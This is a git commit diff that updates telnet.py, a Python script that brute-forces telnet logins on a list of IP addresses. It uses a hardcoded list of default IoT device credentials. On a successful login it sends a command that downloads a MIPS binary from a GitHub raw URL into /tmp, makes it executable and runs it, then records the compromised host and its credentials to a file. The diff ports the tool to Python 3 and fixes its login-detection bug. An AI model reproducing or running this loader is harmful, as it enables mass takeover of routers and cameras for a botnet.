6181d30e9b91294d4c50c28fc849c255bdd31054
20Matrix77 <101499676+20Matrix77@users.noreply.github.com>
2024-10-13 19:51:21 +0500

    Update telnet.py

--- telnet.py
+++ telnet.py
@@ -1,84 +1,97 @@
 import threading
 import sys, os, re, time, socket
-from queue import *
+from queue import Queue
 from sys import stdout
 
+# Ensure correct usage of the script
 if len(sys.argv) < 4:
-    print "Usage: python "+sys.argv[0]+" <list> <threads> <output file>"
+    print("Usage: python3 " + sys.argv[0] + " <list> <threads> <output file>")
     sys.exit()
 
-combo = ["root:root", "admin:admin", "root:vizxv", "root:Serv4EMC", "default:default", "default:OxhlwSG8", "default:S2fGqNFs", "root:xc3511", "admin:dvr2580222", "guest:guest", "daemon:daemon", "root:ipcam_rt5350", "root:hi3518", "user:user", "root:GM8182", "root:5up", "root:password", "admin:password", "ubnt:ubnt", "root:Zte521", "root:vertex25ektks123"]
+# Credentials for brute-forcing
+combo = ["root:root", "admin:admin", "root:vizxv", "root:Serv4EMC", "default:default", 
+         "default:OxhlwSG8", "default:S2fGqNFs", "root:xc3511", "admin:dvr2580222", 
+         "guest:guest", "daemon:daemon", "root:ipcam_rt5350", "root:hi3518", "user:user", 
+         "root:GM8182", "root:5up", "root:password", "admin:password", "ubnt:ubnt", 
+         "root:Zte521", "root:vertex25ektks123"]
 
+# Read IP addresses from the input file
 ips = open(sys.argv[1], "r").readlines()
 threads = int(sys.argv[2])
 output_file = sys.argv[3]
 queue = Queue()
 queue_count = 0
 
+# Add IPs to the queue
 for ip in ips:
     queue_count += 1
     stdout.write("\r[%d] Added to queue" % queue_count)
     stdout.flush()
-    queue.put(ip)
-print "\n"
-
+    queue.put(ip.strip())  # Ensure no extra newlines
+print("\n")
 
 class router(threading.Thread):
-    def __init__ (self, ip):
+    def __init__(self, ip):
         threading.Thread.__init__(self)
         self.ip = str(ip).rstrip('\n')
-        self.rekdevice="cd /tmp; wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; busybox wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; chmod 777 mips; ./mips"
+        self.rekdevice = "cd /tmp; wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; busybox wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; chmod 777 mips; ./mips"
+
     def run(self):
         global fh
         username = ""
         password = ""
         for passwd in combo:
             if ":n/a" in passwd:
-                password=""
+                password = ""
             else:
-                password=passwd.split(":")[1]
+                password = passwd.split(":")[1]
             if "n/a:" in passwd:
-                username=""
+                username = ""
             else:
-                username=passwd.split(":")[0]
+                username = passwd.split(":")[0]
+            
             try:
                 tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 tn.settimeout(0.37)
-                tn.connect((self.ip,23))
+                tn.connect((self.ip, 23))
             except Exception:
                 tn.close()
                 break
+            
             try:
                 hoho = ''
                 hoho += readUntil(tn, ":")
                 if ":" in hoho:
-                    tn.send(username + "\r\n")
+                    tn.send((username + "\r\n").encode())
                     time.sleep(0.1)
             except Exception:
                 tn.close()
+
             try:
                 hoho = ''
                 hoho += readUntil(tn, ":")
                 if ":" in hoho:
-                    tn.send(password + "\r\n")
+                    tn.send((password + "\r\n").encode())
                     time.sleep(0.1)
                 else:
                     pass
             except Exception:
                 tn.close()
+
             try:
-                prompt = ''
-                prompt += tn.recv(40960)
-                if "#" in prompt or "$":
-                    success = True              
+                prompt = tn.recv(40960).decode('utf-8', 'ignore')
+                success = False
+                if "#" in prompt or "$" in prompt:
+                    success = True
                 else:
                     tn.close()
-                if success == True:
+
+                if success:
                     try:
-                        tn.send(self.rekdevice + "\r\n")
+                        tn.send((self.rekdevice + "\r\n").encode())
                         fh.write(self.ip + ":23 " + username + ":" + password + "\n")
                         fh.flush()
-                        print "[+] GOTCHA -> %s:%s:%s"%(username, password, self.ip)
+                        print(f"[+] GOTCHA -> {username}:{password}:{self.ip}")
                         tn.close()
                         break
                     except:
@@ -88,15 +101,18 @@ class router(threading.Thread):
             except Exception:
                 tn.close()
 
+# Helper function to read until a certain string is received
 def readUntil(tn, string, timeout=6):
     buf = ''
     start_time = time.time()
     while time.time() - start_time < timeout:
-        buf += tn.recv(1024)
+        buf += tn.recv(1024).decode('utf-8', 'ignore')
         time.sleep(0.01)
-        if string in buf: return buf
+        if string in buf: 
+            return buf
     raise Exception('TIMEOUT!')
 
+# Worker function to handle multiple threads
 def worker():
     try:
         while True:
@@ -111,9 +127,12 @@ def worker():
     except:
         pass
 
+# Open the output file for writing
 global fh
-fh = open("workingtelnet.txt","a")
-for l in xrange(threads):
+fh = open("workingtelnet.txt", "a")
+
+# Start the worker threads
+for _ in range(threads):
     try:
         t = threading.Thread(target=worker)
         t.start()
